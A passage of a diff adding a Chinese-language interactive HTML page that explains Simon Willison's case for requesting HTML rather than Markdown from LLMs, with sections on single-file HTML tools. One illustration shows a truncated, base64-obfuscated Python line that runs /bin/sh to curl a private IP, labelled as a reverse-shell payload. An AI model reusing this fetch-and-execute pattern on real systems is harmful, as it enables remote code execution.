+  animation: a4_popIn 0.4s 2.1s ease both;
+}
+
+.a4_stage.visible .a4_hosting {
+  animation: a4_fadeIn 0.4s 2.5s ease both;
+}
+
+.a4_stage.visible .a4_hosting_arrow {
+  animation: a4_growDown 0.6s 2.7s ease both;
+}
+
+.a4_stage.visible .a4_free_tag {
+  animation: a4_fadeIn 0.3s 3.1s ease both;
+}
+
+@keyframes a4_slideUp {
+  from {
+    opacity: 0;
+    transform: translateY(30px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+@keyframes a4_popIn {
+  0% {
+    opacity: 0;
+    transform: scale(0.7);
+  }
+  70% {
+    opacity: 1;
+    transform: scale(1.08);
+  }
+  100% {
+    opacity: 1;
+    transform: scale(1);
+  }
+}
+
+@keyframes a4_fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+@keyframes a4_growDown {
+  from {
+    height: 0;
+    opacity: 0;
+  }
+  20% {
+    opacity: 1;
+  }
+  to {
+    height: 60px;
+    opacity: 1;
+  }
+}
+
+</style>
+
+<meta name="description" content="Anthropic Claude Code 团队的 Thariq Shihipar 发出了一个挑战传统认知的观点：当你向 LLM 请求输出时，应该要求 HTML 而非 Markdown。Simon Willison 回应说自己从 GPT-4 时代就默认用 Markdown，因为当时 8,192 token 的上下文窗口 让 Markdown 的 token ">
+<link rel="canonical" href="https://chendi.me/readings/unreasonable-html/">
+<style id="reading-shell-style">
+.reading-shell-link{position:fixed;top:14px;right:14px;z-index:1200;text-decoration:none;background:rgba(255,255,255,.92);color:#1f2937;border:1px solid rgba(15,23,42,.1);border-radius:999px;padding:7px 12px;font:600 12px/1.2 -apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;box-shadow:0 8px 22px rgba(15,23,42,.12);backdrop-filter:blur(10px)}
+.reading-shell-link:hover{color:#be185d;border-color:rgba(190,24,93,.35)}
+@media(max-width:520px){.reading-shell-link{top:auto;right:12px;bottom:14px}}
+</style>
+</head>
+<body>
+<a class="reading-shell-link" href="/readings/">Reading</a>
+
+<div class="breadcrumb" id="breadcrumb"><span class="current">概览</span></div>
+<button class="back-btn" id="backBtn" onclick="goBack()">&#8592;</button>
+<div class="depth-dots" id="depthDots"><div class="dot active"></div><div class="dot"></div></div>
+
+<!-- ═══ Layer 0: 概览 ═══ -->
+<div class="layer active" id="layer-overview" data-depth="0">
+
+  <section class="feed-section" style="background:var(--bg-act1)">
+    <div class="section-inner">
+      <p class="reveal" style="font-size:12px;text-transform:uppercase;letter-spacing:0.1em;color:var(--accent);font-weight:600;margin-bottom:16px;">Simon Willison · 2026.05.08</p>
+      <h2 class="big-statement reveal reveal-delay-1">HTML 的<span style="color:var(--accent)">非理性优势</span>：<br>LLM 输出的范式转变</h2>
+      <p class="body-text reveal reveal-delay-2">Anthropic Claude Code 团队的 Thariq Shihipar 发出了一个挑战传统认知的观点：当你向 LLM 请求输出时，应该要求 HTML 而非 Markdown。Simon Willison 回应说自己从 GPT-4 时代就默认用 Markdown，因为当时 <span class="hl2">8,192 token 的上下文窗口</span>让 Markdown 的 token 效率极为重要——同样的内容，Markdown 比 HTML 节省大量 token。但时代变了。上下文窗口已经从 8K 膨胀到 200K 甚至更多，token 效率不再是瓶颈。而 HTML 能做到的事情远远超越 Markdown：<span class="hl">SVG 图表、交互式组件、页内导航</span>——这些让信息的呈现从「纯文本排版」跃升到「富交互体验」。</p>
+      <div class="anim-stage reveal reveal-delay-3" id="s1-anim"><div class="s1_stage">
+  <!-- Era labels -->
+  <div class="s1_era_label s1_era_left">8K tokens</div>
+  <div class="s1_era_label s1_era_right">200K tokens</div>
+
+  <!-- Left: Markdown doc (muted, flat) -->
+  <div class="s1_md_doc s1_md_doc_dim">
+    <div class="s1_md_line s1_md_line1"></div>
+    <div class="s1_md_line s1_md_line2"></div>
+    <div class="s1_md_line s1_md_line3"></div>
+    <div class="s1_md_line s1_md_line4"></div>
+    <div class="s1_md_label">Markdown</div>
+  </div>
+
+  <!-- Timeline arrow -->
+  <div class="s1_timeline">
+    <div class="s1_timeline_line"></div>
+    <span class="s1_timeline_arrow">&#9654;</span>
+  </div>
+
+  <!-- Right: HTML doc (colorful, rich) -->
+  <div class="s1_html_doc">
+    <!-- Mini SVG chart -->
+    <svg class="s1_mini_chart" viewBox="0 0 80 28">
+      <rect x="4" y="18" width="12" height="10" rx="2" fill="#65A30D" opacity="0.7"/>
+      <rect x="20" y="10" width="12" height="18" rx="2" fill="#65A30D" opacity="0.85"/>
+      <rect x="36" y="4" width="12" height="24" rx="2" fill="#65A30D"/>
+      <rect x="52" y="12" width="12" height="16" rx="2" fill="#7E22CE" opacity="0.7"/>
+      <rect x="68" y="6" width="8" height="22" rx="2" fill="#7E22CE"/>
+    </svg>
+    <!-- Mini toggle -->
+    <div class="s1_mini_toggle"></div>
+    <!-- Mini nav -->
+    <div class="s1_mini_nav">
+      <div class="s1_mini_nav_dot"></div>
+      <div class="s1_mini_nav_dot"></div>
+      <div class="s1_mini_nav_dot"></div>
+    </div>
+    <div class="s1_html_label">HTML</div>
+  </div>
+
+  <!-- Bottom: Three superpowers -->
+  <div class="s1_powers">
+    <div class="s1_power">
+      <div class="s1_power_icon s1_power_icon_svg">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+          <polyline points="4,16 8,8 12,12 16,6 20,10" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+        </svg>
+      </div>
+      <span class="s1_power_text">SVG</span>
+    </div>
+    <div class="s1_power">
+      <div class="s1_power_icon s1_power_icon_widget">
+        <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
+          <rect x="3" y="3" width="16" height="16" rx="3" stroke="#fff" stroke-width="2" fill="none"/>
+          <circle cx="11" cy="11" r="3" fill="#fff"/>
+        </svg>
+      </div>
+      <span class="s1_power_text">交互</span>
+    </div>
+    <div class="s1_power">
+      <div class="s1_power_icon s1_power_icon_nav">
+        <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
+          <line x1="4" y1="6" x2="18" y2="6" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+          <line x1="4" y1="11" x2="14" y2="11" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+          <line x1="4" y1="16" x2="16" y2="16" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+      </div>
+      <span class="s1_power_text">导航</span>
+    </div>
+  </div>
+</div></div>
+      <div class="source-panel reveal reveal-delay-4">
+        <button class="source-toggle" onclick="toggleSource(this)"><span class="arrow">&#9654;</span> 原文对照</button>
+        <div class="source-body"><span class="source-label">Original</span>
+          <p>Thought-provoking piece by Thariq Shihipar (on the Claude Code team at Anthropic) advocating for HTML over Markdown as an output format to request from Claude.</p>
+          <p>I've been defaulting to asking for most things in Markdown since the GPT-4 days, when the 8,192 token limit meant that Markdown's token-efficiency over HTML was extremely worthwhile.</p>
+          <p>Thariq's piece here has caused me to reconsider that, especially for output. Asking Claude for an explanation in HTML means it can drop in SVG diagrams, interactive widgets, in-page navigation and all sorts of other neat ways of making the information more pleasant to navigate.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="feed-section dark">
+    <div class="section-inner">
+      <h2 class="big-statement reveal">Markdown 时代：<br><span style="color:#FCA5A5">8K token</span> 下的生存法则</h2>
+      <p class="body-text reveal reveal-delay-1">回到 2023 年，GPT-4 刚发布时只有 8,192 token 的上下文窗口。在这个极端稀缺的空间里，每一个 token 都是奢侈品。Markdown 的优势在于<span class="hl">极致的 token 效率</span>：一个一级标题 <code># Title</code> 只需 3 个 token，而 HTML 的 <code>&lt;h1&gt;Title&lt;/h1&gt;</code> 要 7 个 token 以上。段落文字不需要任何标签包裹，列表只需 <code>-</code> 开头，代码块用三个反引号就够了。因此在「上下文即黄金」的时代，Markdown 是理性的最优选择——它让模型把宝贵的 token 预算花在内容上，而非格式标签上。整个社区也因此形成了「Markdown 即标准输出格式」的惯性思维。</p>
+      <div class="anim-stage reveal reveal-delay-2" id="s2-anim"><div class="s2_stage">
+  <!-- Budget bar -->
+  <div class="s2_budget">
+    <div class="s2_budget_label">
+      <span>Token 预算</span>
+      <span>8,192 tokens</span>
+    </div>
+    <div class="s2_budget_track">
+      <div class="s2_budget_fill"></div>
+    </div>
+  </div>
+
+  <!-- Column headers -->
+  <div class="s2_headers">
+    <div class="s2_hdr s2_hdr_md">Markdown</div>
+    <div class="s2_hdr s2_hdr_html">HTML</div>
+  </div>
+
+  <!-- Comparison rows -->
+  <div style="padding: 0 2px;">
+    <!-- Row 1: Heading -->
+    <div class="s2_row">
+      <div class="s2_col">
+        <div class="s2_row_label">标题</div>
+        <div class="s2_syntax"># Title</div>
+        <div class="s2_bar_wrap">
+          <div class="s2_bar s2_bar_md">3</div>
+        </div>
+      </div>
+      <div class="s2_col">
+        <div class="s2_row_label">标题</div>
+        <div class="s2_syntax">&lt;h1&gt;Title&lt;/h1&gt;</div>
+        <div class="s2_bar_wrap">
+          <div class="s2_bar s2_bar_html">7</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Row 2: List -->
+    <div class="s2_row">
+      <div class="s2_col">
+        <div class="s2_row_label">列表项</div>
+        <div class="s2_syntax">- item</div>
+        <div class="s2_bar_wrap">
+          <div class="s2_bar s2_bar_md">1</div>
+        </div>
+      </div>
+      <div class="s2_col">
+        <div class="s2_row_label">列表项</div>
+        <div class="s2_syntax">&lt;li&gt;item&lt;/li&gt;</div>
+        <div class="s2_bar_wrap">
+          <div class="s2_bar s2_bar_html">5</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Row 3: Code block -->
+    <div class="s2_row">
+      <div class="s2_col">
+        <div class="s2_row_label">代码块</div>
+        <div class="s2_syntax">```code```</div>
+        <div class="s2_bar_wrap">
+          <div class="s2_bar s2_bar_md">3</div>
+        </div>
+      </div>
+      <div class="s2_col">
+        <div class="s2_row_label">代码块</div>
+        <div class="s2_syntax">&lt;pre&gt;&lt;code&gt;...&lt;/code&gt;&lt;/pre&gt;</div>
+        <div class="s2_bar_wrap">
+          <div class="s2_bar s2_bar_html">8</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Row 4: Bold -->
+    <div class="s2_row">
+      <div class="s2_col">
+        <div class="s2_row_label">加粗</div>
+        <div class="s2_syntax">**text**</div>
+        <div class="s2_bar_wrap">
+          <div class="s2_bar s2_bar_md">2</div>
+        </div>
+      </div>
+      <div class="s2_col">
+        <div class="s2_row_label">加粗</div>
+        <div class="s2_syntax">&lt;strong&gt;text&lt;/strong&gt;</div>
+        <div class="s2_bar_wrap">
+          <div class="s2_bar s2_bar_html">6</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Verdict -->
+  <div class="s2_verdict">
+    <div class="s2_verdict_badge">Markdown 省 2-3x tokens</div>
+    <div class="s2_verdict_sub">8K 窗口下，每个 token 都是生存资源</div>
+  </div>
+</div></div>
+      <div class="source-panel reveal reveal-delay-3">
+        <button class="source-toggle" onclick="toggleSource(this)"><span class="arrow">&#9654;</span> 原文对照</button>
+        <div class="source-body"><span class="source-label">Original</span>
+          <p>I've been defaulting to asking for most things in Markdown since the GPT-4 days, when the 8,192 token limit meant that Markdown's token-efficiency over HTML was extremely worthwhile.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="feed-section" style="background:var(--bg-act2)">
+    <div class="section-inner">
+      <h2 class="big-statement reveal">HTML 的三大超能力：<br><span style="color:var(--accent2)">远超排版</span>的表达空间</h2>
+      <p class="body-text reveal reveal-delay-1">Markdown 本质上是一种排版语言——它能控制标题层级、粗体斜体、列表和代码块，仅此而已。但 HTML 是一种<span class="hl2">完整的文档编程语言</span>，拥有三大 Markdown 无法企及的超能力。第一是 <span class="hl">SVG 图表</span>：LLM 可以在解释中直接嵌入矢量图，画出架构图、流程图、数据可视化，用图形传递文字难以表达的空间关系。第二是<span class="hl2">交互式组件</span>：折叠面板、标签页、可展开的代码块、搜索过滤器——用户可以按需探索，而非被迫线性阅读。第三是<span class="hl">页内导航</span>：目录、锚点跳转、面包屑——让长文档不再是一滚到底的瀑布流，而是结构化的知识空间。</p>
+      <div class="anim-stage reveal reveal-delay-2" id="s3-anim"><div class="s3_stage">
+  <!-- Connector lines -->
+  <div class="s3_conn s3_conn1"></div>
+  <div class="s3_conn s3_conn2"></div>
+
+  <!-- Card 1: SVG Diagrams -->
+  <div class="s3_card s3_card1">
+    <div class="s3_icon s3_icon1">
+      <div class="s3_bar s3_bar1"></div>
+      <div class="s3_bar s3_bar2"></div>
+      <div class="s3_bar s3_bar3"></div>
+    </div>
+    <div>
+      <div class="s3_label">SVG 矢量图</div>
+      <div class="s3_sublabel">架构图、数据可视化、流程图</div>
+    </div>
+  </div>
+
+  <!-- Card 2: Interactive Widgets -->
+  <div class="s3_card s3_card2">
+    <div class="s3_icon s3_icon2">
+      <div class="s3_toggle_track">
+        <div class="s3_toggle_knob"></div>
+      </div>
+    </div>
+    <div>
+      <div class="s3_label">交互组件</div>
+      <div class="s3_sublabel">折叠面板、标签页、搜索过滤</div>
+    </div>
+  </div>
+
+  <!-- Card 3: In-page Navigation -->
+  <div class="s3_card s3_card3">
+    <div class="s3_icon s3_icon3">
+      <div class="s3_nav_wrap">
+        <div class="s3_nav_dot"></div>
+        <div class="s3_nav_line"></div>
+        <div class="s3_nav_branch">
+          <div class="s3_nav_dot"></div>
+          <div class="s3_nav_dot"></div>
+        </div>
+      </div>
+    </div>
+    <div>
+      <div class="s3_label">页内导航</div>
+      <div class="s3_sublabel">目录锚点、面包屑、快速跳转</div>
+    </div>
+  </div>
+</div></div>
+      <p class="hook-line reveal reveal-delay-3">150+ 单文件 HTML 工具背后有哪些实用模式？</p>
+      <button class="drill-btn reveal reveal-delay-4" onclick="drillDown('layer-patterns',this)">深入工具模式 ↓</button>
+    </div>
+  </section>
+
+  <section class="feed-section dark">
+    <div class="section-inner">
+      <h2 class="big-statement reveal">提示词的力量：<br><span style="color:#BEF264">一句话</span>改变输出维度</h2>
+      <p class="body-text reveal reveal-delay-1">Thariq 分享了一个典型的 HTML 输出提示词：「帮我审查这个 PR，创建一个 HTML 页面来描述它。我不太熟悉 streaming/backpressure 的逻辑，所以重点关注这部分。<span class="hl">渲染实际的 diff，用行内边注标注发现，按严重程度颜色编码</span>，以及其他任何有助于传达概念的呈现方式。」这段提示词的关键不在于它要求了 HTML——而在于它释放了 LLM 的表达自由度。因为输出格式是 HTML，模型可以自主决定用什么视觉手法最适合传递信息：红色高亮严重问题、黄色标记警告、绿色表示建议，可折叠的代码块让审查者聚焦关键变更。如果输出是 Markdown，这一切都不可能。</p>
+      <div class="anim-stage reveal reveal-delay-2" id="s4-anim"><div class="s4_stage">
+  <div class="s4_title">PR Review: auth.py #247</div>
+  <div class="s4_card">
+    <div class="s4_header">
+      <span class="s4_dot"></span>
+      <span>auth/session.py - 6 lines changed</span>
+    </div>
+    <div class="s4_diff">
+      <div class="s4_line s4_line--ctx">
+        <span class="s4_gutter">41</span>
+        <span class="s4_prefix--ctx">&nbsp;</span>
+        <span class="s4_code">def verify(token):</span>
+      </div>
+      <div class="s4_line s4_line--del">
+        <span class="s4_gutter">42</span>
+        <span class="s4_prefix--del">-</span>
+        <span class="s4_code">&nbsp; key = env["SECRET"]</span>
+      </div>
+      <div class="s4_line s4_line--add">
+        <span class="s4_gutter">42</span>
+        <span class="s4_prefix--add">+</span>
+        <span class="s4_code">&nbsp; key = get_key()</span>
+      </div>
+      <div class="s4_line s4_line--ctx">
+        <span class="s4_gutter">43</span>
+        <span class="s4_prefix--ctx">&nbsp;</span>
+        <span class="s4_code">&nbsp; payload = decode(token)</span>
+      </div>
+      <div class="s4_line s4_line--del">
+        <span class="s4_gutter">44</span>
+        <span class="s4_prefix--del">-</span>
+        <span class="s4_code">&nbsp; return payload</span>
+      </div>
+      <div class="s4_line s4_line--add">
+        <span class="s4_gutter">44</span>
+        <span class="s4_prefix--add">+</span>
+        <span class="s4_code">&nbsp; return sanitize(payload)</span>
+      </div>
+    </div>
+    <div class="s4_connector"></div>
+    <div class="s4_annotations">
+      <div class="s4_anno s4_anno--danger">
+        <span class="s4_badge s4_badge--danger">严重</span>
+        <span class="s4_anno-text">get_key() 无缓存, 每次请求读磁盘</span>
+        <span class="s4_anno-line">L42</span>
+      </div>
+      <div class="s4_anno s4_anno--warn">
+        <span class="s4_badge s4_badge--warn">警告</span>
+        <span class="s4_anno-text">sanitize 未处理 None 输入</span>
+        <span class="s4_anno-line">L44</span>
+      </div>
+      <div class="s4_anno s4_anno--ok">
+        <span class="s4_badge s4_badge--ok">建议</span>
+        <span class="s4_anno-text">建议添加类型注解提升可读性</span>
+        <span class="s4_anno-line">L41</span>
+      </div>
+    </div>
+  </div>
+  <div class="s4_caption">HTML 输出 = 语义色彩 + 内联标注</div>
+</div></div>
+      <div class="source-panel reveal reveal-delay-3">
+        <button class="source-toggle" onclick="toggleSource(this)"><span class="arrow">&#9654;</span> 原文对照</button>
+        <div class="source-body"><span class="source-label">Original</span>
+          <p>Help me review this PR by creating an HTML artifact that describes it. I'm not very familiar with the streaming/backpressure logic so focus on that. Render the actual diff with inline margin annotations, color-code findings by severity and whatever else might be needed to convey the concept well.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="feed-section" style="background:var(--bg-act1)">
+    <div class="section-inner">
+      <h2 class="big-statement reveal"><span style="color:var(--accent)">150+</span> 单文件 HTML 工具<br>Simon 的工具哲学</h2>
+      <p class="body-text reveal reveal-delay-1">Simon Willison 在两年内借助 LLM 创建了超过 150 个单文件 HTML 工具，托管在 tools.simonwillison.net 上。这些工具有四个共同特征：<span class="hl">单文件</span>（一个 .html 文件包含所有 HTML/CSS/JS）、<span class="hl2">无构建步骤</span>（不用 React、不用 webpack、不用 npm install）、<span class="hl">CDN 依赖</span>（需要的库直接从 CDN 加载）、<span class="hl2">LLM 友好</span>（几百行代码，LLM 能完整理解和修改）。这种模式的妙处在于它完美匹配 LLM 的能力边界——一个 HTML 文件就是一个自包含的应用，LLM 可以从零生成、完整理解、快速迭代。你不需要解释项目结构、不需要配置开发环境，只需要一句提示词。</p>
+      <div class="anim-stage reveal reveal-delay-2" id="s5-anim"><div class="s5_stage">
+  <div class="s5_counter_wrap">
+    <div class="s5_counter_scroll">
+      <div class="s5_counter_tape">
+        <span>0</span>
+        <span>10</span>
+        <span>20</span>
+        <span>30</span>
+        <span>50</span>
+        <span>70</span>
+        <span>90</span>
+        <span>100</span>
+        <span>110</span>
+        <span>120</span>
+        <span>130</span>
+        <span>140</span>
+        <span>145</span>
+        <span>148</span>
+        <span>150</span>
+        <span>150+</span>
+      </div>
+    </div>
+    <div class="s5_counter_label">single-file HTML tools</div>
+  </div>
+  <div class="s5_pulse"></div>
+  <div class="s5_grid">
+    <div class="s5_card">
+      <div class="s5_icon_file"></div>
+      <div class="s5_card_text">单文件</div>
+    </div>
+    <div class="s5_card">
+      <div class="s5_icon_nobuild">
+        <div class="s5_icon_gear"></div>
+        <div class="s5_icon_slash"></div>
+      </div>
+      <div class="s5_card_text">无构建</div>
+    </div>
+    <div class="s5_card">
+      <div class="s5_icon_cloud"></div>
+      <div class="s5_card_text">CDN</div>
+    </div>
+    <div class="s5_card">
+      <div class="s5_icon_brain"></div>
+      <div class="s5_card_text">LLM友好</div>
+    </div>
+  </div>
+</div></div>
+      <p class="hook-line reveal reveal-delay-3">URL 持久化、CORS API、Pyodide——这些高级模式如何运作？</p>
+      <button class="drill-btn reveal reveal-delay-4" onclick="drillDown('layer-advanced',this)">深入高级能力 ↓</button>
+    </div>
+  </section>
+
+  <section class="feed-section dark">
+    <div class="section-inner">
+      <h2 class="big-statement reveal">实战：用 <span style="color:#BEF264">GPT-5.5</span> 解释<br>Linux 安全漏洞</h2>
+      <p class="body-text reveal reveal-delay-1">Simon 用一个真实案例展示了 HTML 输出的威力。copy.fail 网站公开了一个新发现的 Linux 安全漏洞，其 PoC（概念验证）代码以混淆的 Python 脚本形式发布。Simon 把这段混淆代码通过管道输入 GPT-5.5，要求模型「<span class="hl">详细解释这段代码，重新格式化它，展开所有令人困惑的部分，深入分析它做了什么以及如何工作。输出 HTML，用精美的样式和 HTML/CSS/JavaScript 的能力让解释丰富、交互、尽可能清晰</span>」。生成的 HTML 页面包含深色主题、安全警告横幅、高层概述、代码展开分析，以及每个关键函数的交互式详解。Simon 说效果相当不错——虽然应该更强调漏洞本身而非 Python 包装代码。</p>
+      <div class="anim-stage reveal reveal-delay-2" id="s6-anim"><div class="s6_stage">
+  <!-- Obfuscated code input -->
+  <div class="s6_messy_label">copy.fail / 混淆代码</div>
+  <div class="s6_messy">exec(__import__('base64').b64decode(
+b'aW1wb3J0IHN1YnByb2Nlc3M7c3VicH'
+b'JvY2Vzcy5jYWxsKFsnL2Jpbi9zaCcs'
+b'Jy1jJywnY3VybCBodHRwOi8vMTAuMC'
+).decode())</div>
+
+  <!-- Pipeline: arrow + processor + arrow -->
+  <div class="s6_pipeline">
+    <span class="s6_arrow">&#x25BC;</span>
+    <div class="s6_processor">GPT-5.5</div>
+    <span class="s6_arrow">&#x25BC;</span>
+  </div>
+
+  <!-- Beam connector -->
+  <div class="s6_beam"></div>
+
+  <!-- Clean HTML output -->
+  <div class="s6_output_label">HTML 安全分析页</div>
+  <div class="s6_output">
+    <!-- Warning banner -->
+    <div class="s6_warn">
+      <div class="s6_warn_icon">!</div>
+      <span>CVE-2024-XXXX 高危漏洞</span>
+    </div>
+
+    <!-- Summary card -->
+    <div class="s6_summary">
+      <div class="s6_summary_title">漏洞概要</div>
+      <div class="s6_summary_text">base64 解码后执行反弹 shell，利用子进程调用远程 payload</div>
+    </div>
+
+    <!-- Deobfuscated code -->
+    <div class="s6_code_out">
+      <div class="s6_code_out_label">还原后代码</div>
+      import subprocess<br>
+      subprocess.call([<br>
+      &nbsp;&nbsp;'/bin/sh', '-c',<br>
+      &nbsp;&nbsp;'curl http://10.0...'<br>
+      ])
+    </div>
+
+    <!-- Function breakdowns -->
+    <div class="s6_funcs">
+      <div class="s6_func">
+        <div class="s6_func_name">b64decode</div>
+        <div class="s6_func_desc">解码载荷</div>
+      </div>
+      <div class="s6_func">
+        <div class="s6_func_name">exec()</div>
+        <div class="s6_func_desc">执行代码</div>
+      </div>
+      <div class="s6_func">
+        <div class="s6_func_name">curl</div>
+        <div class="s6_func_desc">下载攻击</div>
+      </div>
+    </div>
+  </div>
+</div></div>
+      <div class="source-panel reveal reveal-delay-3">
+        <button class="source-toggle" onclick="toggleSource(this)"><span class="arrow">&#9654;</span> 原文对照</button>
+        <div class="source-body"><span class="source-label">Original</span>
+          <p>copy.fail describes a recently discovered Linux security exploit, including a proof of concept distributed as obfuscated Python.</p>
+          <p>curl https://copy.fail/exp | llm -m gpt-5.5 -s 'Explain this code in detail. Reformat it, expand out any confusing bits and go deep into what it does and how it works. Output HTML, neatly styled and using capabilities of HTML and CSS and JavaScript to make the explanation rich and interactive and as clear as possible'</p>
+          <p>Here's the resulting HTML page. It's pretty good, though I should have emphasized explaining the exploit over the Python harness around it.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<!-- ═══ Layer 1: 工具模式 ═══ -->
+<div class="layer" id="layer-patterns" data-depth="1">
+  <section class="feed-section" style="background:var(--bg-act1)">
+    <div class="section-inner">
+      <h2 class="big-statement reveal">四大原则：<br><span style="color:var(--accent)">单文件</span> · 无React · CDN · LLM友好</h2>
+      <p class="body-text reveal reveal-delay-1">Simon 总结了高效 HTML 工具的四大原则。<span class="hl">单文件</span>意味着所有代码都在一个 .html 文件中，没有多文件依赖，可以随意复制和部署。<span class="hl2">无 React</span> 不是偏见而是务实——React 需要构建步骤和复杂工具链，而原生 HTML/CSS/JS 加上 CDN 库足以应对绝大多数场景。提示词里加一句「No React」就能让 LLM 生成更简洁的代码。<span class="hl">CDN 依赖</span>意味着所有外部库通过 CDN URL 直接引入，不需要 npm install 或 node_modules。最后，<span class="hl2">LLM 友好</span>是指工具代码控制在几百行以内，确保 LLM 能完整理解整个应用的上下文，从而实现「一次提示词 → 完整可用工具」的流程。这四个原则共同构成了 LLM 时代的前端开发范式。</p>
+      <div class="anim-stage reveal reveal-delay-2" id="a1-anim"><div class="a1_stage">
+  <div class="a1_title">-- HTML 工具四原则 --</div>
+  <div class="a1_list">
+    <div class="a1_line"></div>
+    <div class="a1_item">
+      <div class="a1_check"></div>
+      <div class="a1_icon">📄</div>
+      <div class="a1_label">
+        <div class="a1_name">单文件</div>
+        <div class="a1_desc">HTML/CSS/JS 合一</div>
+      </div>
+    </div>
+    <div class="a1_item">
+      <div class="a1_check"></div>
+      <div class="a1_icon">🚫</div>
+      <div class="a1_label">
+        <div class="a1_name">No React</div>
+        <div class="a1_desc">零构建步骤</div>
+      </div>
+    </div>
+    <div class="a1_item">
+      <div class="a1_check"></div>
+      <div class="a1_icon">🌐</div>
+      <div class="a1_label">
+        <div class="a1_name">CDN 依赖</div>
+        <div class="a1_desc">外部库用 URL 引入</div>
+      </div>
+    </div>
+    <div class="a1_item">
+      <div class="a1_check"></div>
+      <div class="a1_icon">🤖</div>
+      <div class="a1_label">
+        <div class="a1_name">LLM 友好</div>
+        <div class="a1_desc">几百行 LLM 全读懂</div>
+      </div>
+    </div>
+  </div>
+  <div class="a1_badge">LLM 时代范式</div>
+</div></div>
+      <div class="source-panel reveal reveal-delay-3">
+        <button class="source-toggle" onclick="toggleSource(this)"><span class="arrow">&#9654;</span> 原文对照</button>
+        <div class="source-body"><span class="source-label">Original</span>
+          <p>Effective HTML tools share four key traits: they exist as single files (enabling easy copying and hosting), avoid React and build steps, load dependencies from CDNs, and maintain manageable size — typically a few hundred lines that LLMs can readily understand and modify.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="feed-section" style="background:var(--bg-act2)">
+    <div class="section-inner">
+      <h2 class="big-statement reveal">状态管理：<br><span style="color:var(--accent2)">URL</span> vs <span style="color:var(--accent)">localStorage</span></h2>
+      <p class="body-text reveal reveal-delay-1">单文件 HTML 工具没有后端数据库，那状态存在哪里？Simon 提出两种互补的方案。<span class="hl2">URL 持久化</span>把应用状态编码到 URL 参数中——比如他的 icon-editor 工具把整个图标设计状态存在 URL 里，用户分享链接就等于分享了完整的工作状态。这种方式天然支持书签和分享，缺点是 URL 长度有限制。<span class="hl">localStorage</span> 适合更大的状态和敏感数据（如 API 密钥）。word-counter 和 render-markdown 工具用 localStorage 自动保存用户输入，防止意外丢失。两种方案的共同点是：完全在浏览器端运行，不需要服务器，不需要用户注册账号。这正是单文件 HTML 工具的哲学——<span class="hl2">零摩擦</span>。</p>
+      <div class="anim-stage reveal reveal-delay-2" id="a2-anim"><div class="a2_stage">
+  <div class="a2_columns">
+    <div class="a2_col a2_col_url">
+      <div class="a2_col_title">URL</div>
+      <div class="a2_bar">
+        <div class="a2_bar_dot"></div>
+        <div class="a2_bar_line"></div>
+      </div>
+      <div class="a2_arrows">
+        <div class="a2_arrow_tag">分享</div>
+        <div class="a2_arrow_tag">书签</div>
+      </div>
+    </div>
+    <div class="a2_col a2_col_local">
+      <div class="a2_col_title">localStorage</div>
+      <div class="a2_db_icon">
+        <div class="a2_db_body"></div>
+        <div class="a2_db_top"></div>
+      </div>
+      <div class="a2_rect_tag">API 密钥</div>
+      <div class="a2_rect_tag">自动保存</div>
+    </div>
+  </div>
+  <div class="a2_badge">
+    <div class="a2_badge_dot"></div>
+    零摩擦
+    <div class="a2_badge_dot"></div>
+  </div>
+</div></div>
+      <div class="source-panel reveal reveal-delay-3">
+        <button class="source-toggle" onclick="toggleSource(this)"><span class="arrow">&#9654;</span> 原文对照</button>
+        <div class="source-body"><span class="source-label">Original</span>
+          <p>URL-based persistence works well for shareable, bookmarkable applications. The icon-editor tool exemplifies storing substantial design state directly in URLs.</p>
+          <p>localStorage accommodates larger state and secrets like API keys without server exposure. Tools like word-counter and render-markdown use this pattern to auto-save work, preventing accidental data loss.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<!-- ═══ Layer 1: 高级能力 ═══ -->
+<div class="layer" id="layer-advanced" data-depth="1">
+  <section class="feed-section" style="background:var(--bg-act1)">
+    <div class="section-inner">
+      <h2 class="big-statement reveal">CORS API + 文件处理：<br><span style="color:var(--accent)">浏览器就是后端</span></h2>
+      <p class="body-text reveal reveal-delay-1">单文件 HTML 工具不只是静态展示——它们可以直接调用外部 API 和处理本地文件。<span class="hl">CORS 友好的 API</span> 是关键资源：iNaturalist、PyPI、GitHub、Bluesky、Mastodon 都支持浏览器直接调用。GitHub 的公开仓库 API 特别好用，通过 raw.githubusercontent.com 访问的内容有 CDN 缓存，不用担心速率限制。OpenAI、Anthropic、Gemini 的 <span class="hl2">LLM API 也支持 CORS</span>，结合 localStorage 存储 API 密钥就能在浏览器端直接调用大模型。<span class="hl">文件处理</span>方面，<code>&lt;input type="file"&gt;</code> 加上浏览器端库可以实现 OCR（Tesseract.js）、PDF 解析（PDF.js）等复杂功能，完全不需要上传到服务器。</p>
+      <div class="anim-stage reveal reveal-delay-2" id="a3-anim"><div class="a3_stage">
+  <div class="a3_title">CORS API + 文件处理</div>
+  <div class="a3_subtitle">浏览器就是后端</div>
+
+  <div class="a3_head_api">CORS API</div>
+  <div class="a3_head_file">本地文件</div>
+
+  <!-- API tags -->
+  <div class="a3_api_col">
+    <div class="a3_api_tag a3_at1">GitHub</div>
+    <div class="a3_api_tag a3_at2">PyPI</div>
+    <div class="a3_api_tag a3_at3">LLM</div>
+    <div class="a3_api_tag a3_at4">Bluesky</div>
+  </div>
+
+  <!-- API arrows -->
+  <div class="a3_arw_l a3_al1"></div>
+  <div class="a3_arw_l a3_al2"></div>
